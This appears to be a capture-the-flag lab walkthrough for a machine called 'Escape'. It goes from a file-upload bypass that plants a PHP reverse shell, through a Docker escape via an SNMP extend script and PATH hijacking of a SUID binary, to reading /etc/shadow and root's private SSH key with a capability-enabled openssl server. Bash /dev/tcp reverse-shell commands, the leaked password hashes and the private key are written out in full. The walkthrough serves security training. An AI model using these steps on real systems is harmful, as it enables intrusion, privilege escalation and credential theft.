Exploitation Guide for Escape
Summary

We'll gain a foothold on this machine via a file upload vulnerability in a Wordpress application. We'll then escalate by escaping a Docker container and then exploit a misconfiguration in the capabilities of the openssl binary.
Enumeration
Nmap

Let's begin with a simple Nmap TCP scan:

kali@kali:~$ sudo nmap -sV -sC 192.168.120.138
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 10:27 EST
Nmap scan report for 192.168.120.138
Host is up (0.033s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bc:05:c9:c1:13:3f:6c:78:a2:0b:21:45:ed:dd:b7:c1 (RSA)
|   256 f1:17:06:09:6a:be:d5:71:09:57:d9:79:60:95:a4:bd (ECDSA)
|_  256 76:f9:15:70:bc:5d:33:53:0f:3b:20:9e:ec:36:b1:51 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.5.3
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Escape &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Ports 80 and 8080 are open, and it appears that an Apache server (with a default site) is running on port 80, and an Apache server (with a non-default site) is running on port 8080. Let's begin by focussing on the web server running on port 8080. Navigating to the site returns a default Wordpress installation.
Wordpress Enumeration

Let's scan this site with gobuster to obtain more information.

kali@kali:~$ gobuster dir -u http://192.168.120.138:8080 -w /usr/share/wordlists/dirb/common.txt -z
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
/dev (Status: 301)
...

This scan reveals the /dev directory. Navigating there presents the following:

Developer Area: Proceed with Caution

Description

-As of now, we are only accepting GIF files.

The file upload control apparently only accepts .gif files. Attempting to upload any other type of file generates an error (Sorry, GIF only!).

Let's try to upload a test GIF file. We'll just use a GIF file we located with a Google search. The upload succeeds, returning the message File is valid, and was successfully uploaded. In addition, we are presented with an UPLOADED link that leads to http://192.168.120.138:8080/dev/uploads/test.gif.

If we navigate there, we find our test image file. This indicates that once our file is accepted, it is saved to the /dev/uploads directory.
Exploitation
File Upload Vulnerability

Let's attempt a simple restriction bypass by intercepting our upload request and changing the content type of our file. First, we'll need to set up our web browser to use the Burp proxy.

We'll try to upload a PHP reverse shell from PentestMonkey, making sure to adjust the IP address and port number as needed.

kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php .
kali@kali:~$ 
kali@kali:~$ cat php-reverse-shell.php
...
$ip = '192.168.118.3';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
...

Let's upload the reverse shell and intercept the request in our proxy. Our POST request should resemble the following:

...
-----------------------------253992999841778443251616883509
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------253992999841778443251616883509
Content-Disposition: form-data; name="uploadedfile"; filename="php-reverse-shell.php"
Content-Type: application/x-php
...

Before forwarding the request to the server, we will adjust the file name to shell.php and Content-Type to image/gif like so:

...
-----------------------------253992999841778443251616883509
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------253992999841778443251616883509
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: image/gif
...

We'll forward the modified request to the server and eventually receive the message, File is valid, and was successfully uploaded. We know that our file should be accessible as /dev/uploads/shell.php.

Let's set up a netcat listener on port 4444 and trigger the reverse shell by navigating to http://192.168.120.138:8080/dev/uploads/shell.php:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.138: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.138] 56326
Linux bf4aa159b77b 4.15.0-122-generic #124-Ubuntu SMP Thu Oct 15 13:03:05 UTC 2020 x86_64 GNU/Linux
 16:28:55 up  1:03,  0 users,  load average: 0.00, 0.04, 0.26
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)

We have caught our reverse shell as the www-data user.
Docker Container

The machine's hostname suggests we are actually in a Docker container that we must first escape.

$ hostname
f8e1a236869d

tmpfs

In Docker containerization, file systems are often mounted between the host and a container. Let's check for file system mounts.

$ mount
...
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
...
/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
...

This output is revealing. First, it appears that tmpfs is being used to easily transfer files between the host and the container without having to log in each time. Second, it is mounted on the /tmp directory of the container.

This command output presents a clearer picture:

$ df -T /tmp
Filesystem     Type 1K-blocks    Used Available Use% Mounted on
/dev/sda1      ext4  16446332 4761392  10829800  31% /tmp

When a container is created with a tmpfs mount, the container can write files outside of the container's writeable layer. As opposed to volumes and bind mounts, a tmpfs mount is temporary and only persists in the host's memory.

We'll note this for future reference.
SNMP

Exploring the container, we find an SNMP configuration file in /var/backups:

$ cd /var/backups && ls -la
total 20
drwxr-xr-x 1 root root 4096 Nov  5 13:41 .
drwxr-xr-x 1 root root 4096 Oct 13 09:15 ..
-rwxrw-rw- 1 root root 7340 Sep 18 17:11 .snmpd.conf

This indicates that an SNMP is likely running. Usually, only one process runs in a Docker container, and we know that this container already has a running web application. Because of this, we can speculate that the SNMP daemon is running on the host and not inside the container.

While inspecting the contents of /var/backups.snmpd.conf, we find an interesting community string (53cur3M0NiT0riNg):

$ cat .snmpd.conf
...
rocommunity6 public  default   -V systemonly

rocommunity 53cur3M0NiT0riNg
...

In addition, there is interesting information near the end of the file:

...
#
#  EXTENDING THE AGENT
#

#
#  Arbitrary extension commands
#
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest

#  Note that this last entry requires the script '/tmp/shtest' to be created first,
#    containing the same three shell commands, before the line is uncommented

#  Walk the NET-SNMP-EXTEND-MIB tables (nsExtendConfigTable, nsExtendOutput1Table
#     and nsExtendOutput2Table) to see the resulting output
...

The SNMP service can be extended in multiple ways. For example, it can be extended with functions provided by the NET-SNMP-EXTEND-MIB MIB. The Net-SNMP agent provides a MIB extension (NET-SNMP-EXTEND-MIB) that can be used to execute arbitrary shell scripts. So, by invoking NET-SNMP-EXTEND-MIB over SNMP, we can call arbitrary scripts or executables on the server.

Since we know the community string 53cur3M0NiT0riNg, let's try querying it from our attack machine using snmpwalk with EXTEND. Before doing this, we'll have to install and update the following packages:

kali@kali:~$ sudo apt-get install snmp -y
kali@kali:~$ sudo apt-get install snmp-mibs-downloader -y

Next, we need to download MIB:

kali@kali:~$ sudo download-mibs

Finally, we'll set mibs +ALL in /etc/snmp/snmp.conf.

kali@kali:~$ cat /etc/snmp/snmp.conf
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
mibs +ALL
...

Recall the following comment in the SNMP configuration file:

...
#  Walk the NET-SNMP-EXTEND-MIB tables (nsExtendConfigTable, nsExtendOutput1Table
#     and nsExtendOutput2Table) to see the resulting output
...

Noting the example of nsExtendOutput1Table, we can query the SNMP daemon on the target as follows:

kali@kali:~$ snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.120.138 nsExtendOutput1
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test3" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
NET-SNMP-EXTEND-MIB::nsExtendResult."test3" = INTEGER: 32512

The query seems work, returning a Hello, World! string (which we discovered in the extend functionality of the .snmpd.conf file). This means that we can use this query to execute commands on the target.

In the config file, we also determined that the daemon is executing /tmp/shtest (which is the default in SNMP). We also know that tmpfs is already mounted on the /tmp directory of our container. This all suggests that we should be able to get a shell on the host.
Docker Container Escape via SNMP

Let's navigate to the /tmp directory, create a simple bash reverse shell named shtest (which is what SNMP is looking for), and make it executable.

$ cd /tmp
$ echo 'bash -c "bash -i >& /dev/tcp/192.168.118.3/4444 0>&1"' > shtest
$ chmod +x shtest

Next, we'll set up a new netcat listener on port 4444 and trigger the reverse shell with the same snmpwalk query.

kali@kali:~$ snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.120.138 nsExtendOutput1
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
Timeout: No Response from 192.168.120.138
...

Now, we have a reverse shell as Debian-snmp on the host itself:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.138: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.138] 44310
bash: cannot set terminal process group (711): Inappropriate ioctl for device
bash: no job control in this shell
Debian-snmp@escape:/$ id
id
uid=111(Debian-snmp) gid=115(Debian-snmp) groups=115(Debian-snmp)
Debian-snmp@escape:/$ hostname
hostname
escape

Escalation
SUID Enumeration

Having obtained a shell on the host, let's enumerate SUID permissions.

Debian-snmp@escape:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/logconsole
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su

Let's focus on /usr/bin/logconsole, which is owned by the user tom:

Debian-snmp@escape:/$ ls -l /usr/bin/logconsole
ls -l /usr/bin/logconsole
-rwsrwxr-x 1 tom tom 17440 Nov  5 08:42 /usr/bin/logconsole

PATH Hijacking

Executing this binary produces the following output:

Debian-snmp@escape:/$ /usr/bin/logconsole
/usr/bin/logconsole


 /$$                                                                       /$$          
| $$                                                                      | $$          
| $$  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ | $$  /$$$$$$ 
| $$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$| $$__  $$ /$$_____/ /$$__  $$| $$ /$$__  $$
| $$| $$  \ $$| $$  \ $$| $$      | $$  \ $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$| $$$$$$$$
| $$| $$  | $$| $$  | $$| $$      | $$  | $$| $$  | $$ \____  $$| $$  | $$| $$| $$_____/
| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$$$$$$/|  $$$$$$/| $$|  $$$$$$$
|__/ \______/  \____  $$ \_______/ \______/ |__/  |__/|_______/  \______/ |__/ \_______/
               /$$  \ $$                                                                
              |  $$$$$$/                                                                
               \______/                                                                 

                                                                                                                                         
1. About the Sytem
2. Current Process Status                                                                                                 
3. List all the Users Logged in and out                                                                                   
4. Quick summary of User Logged in                                                                                        
5. IP Routing Table                                                                                                       
6. CPU Information                                                                                                        
7. To Exit                                                                                                                
99. Generate the Report                                                                                                   
                                                                                                                          
Enter the option ==> 

The program is waiting for input. We need to explore a bit more, so for now, we'll enter 7 to exit:

...
Enter the option ==> 7                                                                                                    
Debian-snmp@escape:/$

Let's run this binary again using ltrace to trace the library calls.

Debian-snmp@escape:/$ ltrace /usr/bin/logconsole
ltrace /usr/bin/logconsole
puts("\n\n /$$                          "...)    = 1120
setvbuf(0x7faff2b5da00, 0, 2, 0)                 = 0
setvbuf(0x7faff2b5e760, 0, 2, 0
...                                                    
)                 = 0
getuid()                                         = 111
geteuid()                                        = 111
setreuid(111, 111)                               = 0
printf("\033[1;31m")                             = 7
puts("1. About the Sytem"1. About the Sytem                                                                               
)                       = 19                                                                                              
puts("2. Current Process Status"2. Current Process Status                                                                 
)                = 26                                                                                                     
puts("3. List all the Users Logged in "...3. List all the Users Logged in and out                                         
)      = 40                                                                                                               
puts("4. Quick summary of User Logged "...4. Quick summary of User Logged in                                              
)      = 35                                                                                                               
puts("5. IP Routing Table"5. IP Routing Table                                                                             
)                      = 20                                                                                               
puts("6. CPU Information"6. CPU Information                                                                               
)                       = 19                                                                                              
puts("7. To Exit "7. To Exit                                                                                              
)                              = 12                                                                                       
puts("99. Generate the Report "99. Generate the Report                                                                    
)                 = 25                                                                                                    
putchar(10, 0x7faff2b5e7e3, 0x7faff2b5f8c0, 0x7faff2882224                                                                
) = 10                                                                                                                    
printf("\033[01;33m")                            = 8                                                                      
printf("Enter the option ==> "Enter the option ==> )                  = 21                                                
__isoc99_scanf(0x5597d51aa5c6, 0x7fff79a78c28, 0x7faff2b5f8c0, 0

The output reveals the commands that are used behind the scenes. For example, entering option 1 runs /bin/uname -a:

...
putchar(10, 0x7fff79a76580, 0x5597d51aa650, 0
)   = 10
system("/bin/uname -a"Linux escape 4.15.0-122-generic #124-Ubuntu SMP Thu Oct 15 13:03:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 <no return ...>
--- SIGCHLD (Child exited) ---
...

Option 2 runs /bin/ps aux:

...
putchar(10, 0x7fff79a76580, 0x5597d51aa650, 0
)   = 10
system("/bin/ps aux"USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.8 225180  8740 ?        Ss   09:23   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    09:23   0:00 [kthreadd]
...

We continue investigating the options until we reach option 6 (CPU Information). This option runs lscpu:

...
) = 1                                                                                                                     
printf("\033[0m")                                = 4                                                                      
putchar(10, 0x7fff79a76580, 0x5597d51aa650, 0
)   = 10
system("lscpu"Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
...

Inspecting the output very closely, we discover that lscpu is being used without specifying its full path. That makes it vulnerable to PATH hijacking. Let's inspect the current value of the PATH variable.

Debian-snmp@escape:/$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

When the full PATH is not specified, /usr/local/sbin directory will be searched first, then /usr/local/bin and so on until the binary is found.

After checking the permissions on all of these directories, we realize that we are not able to write to any of them. However, we can modify the PATH variable itself to introduce a new path of our choice that will be searched first.

Let's prepend the /tmp directory onto the current PATH variable:

Debian-snmp@escape:/$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
Debian-snmp@escape:/$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

We'll create another bash reverse shell payload named lscpu, place it in the /tmp directory, and make it executable.

Debian-snmp@escape:/$ cd /tmp
cd /tmp
Debian-snmp@escape:/tmp$ echo 'bash -c "bash -i >& /dev/tcp/192.168.118.3/4444 0>&1"' > lscpu
<sh -i >& /dev/tcp/192.168.118.3/4444 0>&1"' > lscpu
Debian-snmp@escape:/tmp$ chmod +x lscpu
chmod +x lscpu

If we run logconsole now and choose option 6, it should find and run our payload first. Let's try this. We'll set up a new netcat listener on port 4444 and then run logconsole again.

Debian-snmp@escape:/tmp$ /usr/bin/logconsole
/usr/bin/logconsole
...
Enter the option ==> 6
...

This time, the program hangs, and our listener indicates that we have caught a reverse shell as tom:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.138: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.138] 44312
bash: cannot set terminal process group (711): Inappropriate ioctl for device
bash: no job control in this shell
tom@escape:/tmp$ id
id
uid=1000(tom) gid=115(Debian-snmp) groups=115(Debian-snmp)

SSH

To upgrade our shell, and to make the rest of the exploitation process easier, let's log in as tom via SSH. If needed, we can generate an SSH key pair as follows:

kali@kali:~$ ssh-keygen -t rsa -N '' -f /home/kali/.ssh/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:orVB16WHP9petyWNEUtpkr6AdfS9xLyPX5s7LVomyXQ kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|            o    |
|         . = ooo |
|      . . = = *+.|
|     . . o = +.oo|
|      + S . = Eo |
|     o +   * = =.|
|    . .   . * B B|
|           . =.=B|
|            o. *+|
+----[SHA256]-----+

Let's copy our public SSH key to the target and save it as /home/tom/.ssh/authorized_keys.

kali@kali:~$ cd .ssh/
kali@kali:~/.ssh$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.138 - - [05/Nov/2020 12:40:34] "GET /id_rsa.pub HTTP/1.1" 200 -
...

tom@escape:/tmp$ mkdir /home/tom/.ssh
mkdir /home/tom/.ssh
tom@escape:/tmp$ wget http://192.168.118.3/id_rsa.pub -O /home/tom/.ssh/authorized_keys
<.118.3/id_rsa.pub -O /home/tom/.ssh/authorized_keys
--2020-11-05 12:40:33--  http://192.168.118.3/id_rsa.pub
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/octet-stream]
Saving to: ‘/home/tom/.ssh/authorized_keys’

     0K                                                       100% 49.4M=0s

2020-11-05 12:40:34 (49.4 MB/s) - ‘/home/tom/.ssh/authorized_keys’ saved [563/563]

We can now SSH to the target as tom:

kali@kali:~$ ssh -o StrictHostKeyChecking=no tom@192.168.120.138
...
$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom)

Local Enumeration

Next, we'll download lse.sh, a Linux enumeration script.

$ wget http://192.168.118.3/lse.sh
--2020-11-05 12:44:50--  http://192.168.118.3/lse.sh
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40580 (40K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                         100%[==================================================>]  39.63K  --.-KB/s    in 0.06s   

2020-11-05 12:44:51 (620 KB/s) - ‘lse.sh’ saved [40580/40580]

We'll make the script executable and run it to obtain more information.

$ chmod +x lse.sh
$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: 
---
...                                          
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. yes!
---
/opt/cert/openssl
---
[!] sec030 Do we have all caps in any binary?.............................. yes!
---
/opt/cert/openssl =ep
---
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
========================================================( recurrent tasks )=====
...

The script finds that /opt/cert/openssl has empty capabilities. Linux capabilities allow binaries that are executed by non-root users to perform limited privileged (root) operations.

We can confirm this with the following:

$ cd /opt/cert && ls -la
total 724
drwxr-xr-x 2 root root   4096 Nov  5 08:42 .
drwxr-xr-x 4 root root   4096 Nov  5 08:42 ..
-rwx------ 1 root root   1245 Nov  5 08:42 certificate.pem
-rwx------ 1 root root   1704 Nov  5 08:42 key.pem
-rwxr-x--- 1 tom  tom  723944 Nov  5 08:42 openssl
$ getcap ./openssl
./openssl =ep

OpenSSL Web Server

In order to exploit this potential vulnerability, we must run /opt/cert/openssl. This program can be used to host a local web server. However, before running it, we need to generate a certificate as follows, leaving all the options blank:

$ cd /tmp
$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
Can't load /home/tom/.rnd into RNG
140554770244032:error:2406F079:random number generator:RAND_load_file:Cannot open file:../crypto/rand/randfile.c:88:Filename=/home/tom/.rnd
Generating a RSA private key
.............................................................................................................................................................................................+++++
............................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

We must run this from the root directory of the file system because OpenSSL's HTTP server interprets GET requests relative to pwd or cwd.

$ cd /
$ /opt/cert/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
Using default temp DH parameters
ACCEPT
...

This command shell will hang since it is actively running the web server. Let's grab another command shell through SSH:

kali@kali:~$ ssh -o StrictHostKeyChecking=no tom@192.168.120.138
...
$

Because of the capabilities of the /opt/cert/openssl binary, the web server we've launched on port 1337 is running with elevated privileges. That means that we are able to read system files, which are normally only accessible to the root user. For example, we can read /etc/shadow:

$ curl -k https://localhost:1337/etc/shadow
root:$6$l.uc4X2N$d8BE4nsw5eEN3wl.jrWIxHOS65BES386a8Q2i87xqIwYMoWq0MnVCc.rGRToKjmIhiW5Bm0RQM8VENJq7kwoq/:18571:0:99999:7:::
daemon:*:17647:0:99999:7:::
...
tom:$6$xeqOHdfk$JasGRYragbnhO2cM7R4AX2lOal20aR/WlD84MJSmgzBXeBY0Spf5Wt18S.vDwsHHvLU0wMzkSwxxFCuBLbn1r.:18571:0:99999:7:::
$

Let's determine if the root user has a private SSH key available:

$ curl -k https://localhost:1337/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwwvvVIS3//uz+Mpg24l51p48akveZgI8bDQDun7y9BKhRDWg
GzIzCpt7NcVWVN2llo9KOL3c3EZZxGOaTbzpINZxSWj3/WWBYhNqmKQRsgJzbPv2
kOe/XwWw8Bt9TuFAd7GUbylpbyHOES7siXFUd/XP503ehllp/JFp0G+2YPkYPGbi
0EISJcNFPNnRlXIQs3Fte0QqFiPE9nPycSMqvGz8a9OtaPGlmOZ3wP56jxxIBT0I
SrkfuLGw7b9VN05jJ33EMtDGRyyDLljFXv7t5OktkC0omumXyWG2KRRe3Avn4RMI
V+IE0rS8N2pIymRF3u8U/9YMX/Ps2EPvNQFkTQIDAQABAoIBAQCXXa/Ce6z/76pf
rU81kJ8JO4vPQkm6CIozvroWBWcumzaj5Kn38SFDXh5kQF0bR1e2XEVRe6bnG4GW
s2WQZsbVQRZxzhCGiju6jS7wfoNtDhHdxjw3gGI3sAb8j5jTmmOZgCqdihnUsPtm
wm+2ykivQAi0jO3gfYuPApqHs+ppngt2KeMUZesIz4BWuFAnS0ePK/tpTHpZ4KRj
D/sb1kdseaCmPfOD6oTMGNtTiakkDUzObN3Pw19v5wkHfawTbmsSeiPmW1nC5xh/
OI7K+wbVUCj3Dys3xqKoCMK27y+pYHzzoiz7ol+OitIth6ucDe6NC6cFbVPmW2o0
fk+U8VbRAoGBAOcfAlARjYV6qc2ukF9NYlVy/WYoP3zFzfb7uYu9I1OpLID+PYeN
ixpqKKgRoxM+ndsWWnyHjw5Kyq2+DHBE67OOpbd69y+fUYOhFiSH2TnQsB1LPtkH
ZT0pZyaBavQLZFZChpOeQ96qfEw5xwA65zENCSFoGoILHS92akVmWQnTAoGBANgK
0qNNsJYETJSob/KdnMYXbE3tPjNkdCzKXXklgZXeUKn6U//0vRhJWZGHv8RDWrlh
1wc9Op88Dx003Ay+3vVqjOs7ur46KankMTj+PN5B5CX1CioXtJ9T6qRF+8+46oq7
pXBTqfi7Gp2m+RuQJS9Ct2bu6OUYgGdUzQ8p/+VfAoGAOhCnUxhl1sAPgxY1PUxC
xTcDhLPd52oGqeNqJTpacr1Q6gN1z+V2qic7maX8s2wK2q0OBLVF8pBFxUq280nN
caoH5kXlbjh3kTtaRck/gO/2HxX1by8Vdz08pgbjqPZnuegyyUl8wadRXREy9tLV
nJQq1BLEfiFurqrwXgktm3MCgYEAroDPcyilogcG9Gy5P/cfUsJIsQkYXNqfHC65
IcmxyiQwc5vHjc9ZjexxdKN5ukXNWkA1N5u1ZjlU2/p+Y60o2oKeIMO2K0E/tgKj
36077Sq75gzvkOBk/O0Dcn000KxEhprbHsf1WvuGnCDqxeDAqFPzYClJ5QLNdKmC
mOUL1XECgYB1wX6H2xWJ+GvC1qKVs4WOYjfCvVZTh+9i8CpA1i4xmmmXXnc+jy/O
Bl7VLsdfeQ3L/NOBTng09PO2lwSWdghCMeS25rMm6/xZTOduauGVTMKx4DT7FvX6
NLU86rcVJCcqL0LdcJ7/2tmwsyuqhCLQ0fl37ZCS93LTXqGUzXfViw==
-----END RSA PRIVATE KEY-----

Strangely enough, if we view root's authorized_keys file, we determine that the machine allows its own private key for the root user:

$ curl -k https://localhost:1337/root/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDC+9UhLf/+7P4ymDbiXnWnjxqS95mAjxsNAO6fvL0EqFENaAbMjMKm3s1xVZU3aWWj0o4vdzcRlnEY5pNvOkg1nFJaPf9ZYFiE2qYpBGyAnNs+/aQ579fBbDwG31O4UB3sZRvKWlvIc4RLuyJcVR39c/nTd6GWWn8kWnQb7Zg+Rg8ZuLQQhIlw0U82dGVchCzcW17RCoWI8T2c/JxIyq8bPxr061o8aWY5nfA/nqPHEgFPQhKuR+4sbDtv1U3TmMnfcQy0MZHLIMuWMVe/u3k6S2QLSia6ZfJYbYpFF7cC+fhEwhX4gTStLw3akjKZEXe7xT/1gxf8+zYQ+81AWRN root@escape

We can confirm this by comparing it to the public key.

$ curl -k https://localhost:1337/root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDC+9UhLf/+7P4ymDbiXnWnjxqS95mAjxsNAO6fvL0EqFENaAbMjMKm3s1xVZU3aWWj0o4vdzcRlnEY5pNvOkg1nFJaPf9ZYFiE2qYpBGyAnNs+/aQ579fBbDwG31O4UB3sZRvKWlvIc4RLuyJcVR39c/nTd6GWWn8kWnQb7Zg+Rg8ZuLQQhIlw0U82dGVchCzcW17RCoWI8T2c/JxIyq8bPxr061o8aWY5nfA/nqPHEgFPQhKuR+4sbDtv1U3TmMnfcQy0MZHLIMuWMVe/u3k6S2QLSia6ZfJYbYpFF7cC+fhEwhX4gTStLw3akjKZEXe7xT/1gxf8+zYQ+81AWRN root@escape

To exploit this, we can simply copy the private key to our attack machine, save it as id_rsa, give it proper permissions, and then SSH to the target as root:

kali@kali:~$ chmod 0600 id_rsa
kali@kali:~$ ssh -i id_rsa -o StrictHostKeyChecking=no root@192.168.120.138
...
root@escape:~# id
uid=0(root) gid=0(root) groups=0(root)
root@escape:~#

